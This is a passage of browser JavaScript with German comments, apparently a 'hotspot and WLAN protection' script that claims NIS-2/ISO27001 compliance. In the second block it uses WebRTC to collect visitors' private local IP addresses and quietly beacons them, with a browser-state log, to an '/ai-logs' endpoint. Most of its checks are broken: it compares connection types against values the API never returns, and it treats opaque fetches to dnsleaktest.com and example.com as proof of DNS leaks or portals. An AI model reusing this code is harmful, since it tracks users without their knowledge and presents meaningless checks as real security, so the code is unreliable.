                console.log('Unbekannter Netzwerktyp:', networkType);
            }

            // Zusätzliche Schutzmaßnahme: Warnung, wenn der Benutzer mit mobilen Daten verbunden ist
            if (isMobileData) {
                alert("Warnung: Du bist mit mobilen Daten verbunden. Bitte sei vorsichtig bei großen Datenübertragungen.");
                // Du kannst hier zusätzliche Maßnahmen einbauen, z.B. große Medieninhalte blockieren
            }
        }

        // Initiale Überprüfung
        checkNetworkType();

        // Überwache Änderungen der Verbindung (z.B. Wechsel zwischen WLAN und mobilen Daten)
        connection.addEventListener('change', checkNetworkType);
    } else {
        console.log("Network Information API wird von diesem Browser nicht unterstützt.");
    }
})();
(function () {
  console.log("🛡️ Hotspot & WLAN-Schutz aktiv – NIS-2/ISO27001 Mode");

  // 1. Verbindungstyp erkennen (WLAN, 4G, etc.)
  if (navigator.connection) {
    console.log("📶 Verbindungstyp:", navigator.connection.effectiveType);
    if (["cellular", "2g", "slow-2g"].includes(navigator.connection.effectiveType)) {
      console.warn("⚠️ Möglicherweise instabile oder mobile Verbindung erkannt (Hotspot möglich)");
    }
  }

  // 2. DNS Leak Test (sehr häufig bei Hotspots)
  fetch("https://my.dnsleaktest.com/", {mode: "no-cors"})
    .then(() => console.warn("🧨 DNS Leak möglich – Hotspot oder transparenter Proxy aktiv"))
    .catch(() => console.log("✅ DNS scheint geschützt"));

  // 3. WebRTC Leak Check (Private IPs sichtbar?)
  try {
    let rtc = new RTCPeerConnection({iceServers: []});
    rtc.createDataChannel("");
    rtc.createOffer().then(o => rtc.setLocalDescription(o));
    rtc.onicecandidate = ({candidate}) => {
      if (candidate && /192\.168|10\.|172\./.test(candidate.candidate)) {
        console.warn("🌐 Private IP erkannt – Lokales Netzwerk oder Hotspot!");
        navigator.sendBeacon("/ai-logs", JSON.stringify({
          type: "webrtc-leak",
          candidate: candidate.candidate,
          timestamp: Date.now(),
          tag: "AI#"
        }));
      }
    };
  } catch (e) {
    console.error("❌ WebRTC Leak Check fehlgeschlagen:", e);
  }

  // 4. HTTP Redirect Check (Captive Portal Detection)
  fetch("http://example.com", {mode: "no-cors"})
    .then(() => console.warn("⚠️ HTTP erlaubt – Möglicherweise unsicherer Hotspot oder Portal"))
    .catch(() => console.log("✅ Kein HTTP: Weiterer Schutz vorhanden"));

  // 5. Hostname Check auf Captive Portal
  if (location.hostname.match(/login|hotspot|auth|portal/)) {
    console.warn("🚨 Hostname verdächtig – Hotspot oder Captive Portal?");
  }

  // 6. AI# Beacon Logging – Hotspot Awareness
  try {
    navigator.sendBeacon("/ai-logs", JSON.stringify({
      type: "hotspot-scan",
      status: "done",
      network: navigator.connection ? navigator.connection.effectiveType : "unknown",
      timestamp: Date.now(),
      tag: "AI#"
    }));
  } catch (e) {
    console.warn("❌ Beacon nicht gesendet:", e);
  }

  // 7. Sichtbarkeitswarnung (Browser versteckt → Hotspot Scans?)
  document.addEventListener("visibilitychange", () => {
    if (document.hidden) {
      console.warn("👁️ Browser versteckt – prüfen Sie Ihre Umgebung!");
    }
  });

  // 8. Touch Device + WLAN Erkennung kombinieren
  if ('ontouchstart' in window && navigator.connection?.effectiveType === "wifi") {
    console.warn("📱 Mobilgerät im WLAN – Hotspot-Nutzung möglich");
  }

  // 9. DNS Block Detection (Indikator für Eingriffe)
  fetch("https://cdexample.com/favicon.ico", {cache: "no-store"})
    .then(res => {
      if (res.status === 200 || res.status === 304) {
        console.log("🧩 DNS-Antwort erhalten");
      } else {
        console.warn("🚫 DNS ungewöhnlich oder gefälscht");
      }
    })
    .catch(() => console.warn("🚫 DNS-Antwort blockiert – Manipulation möglich"));

})();


  
  
 
   
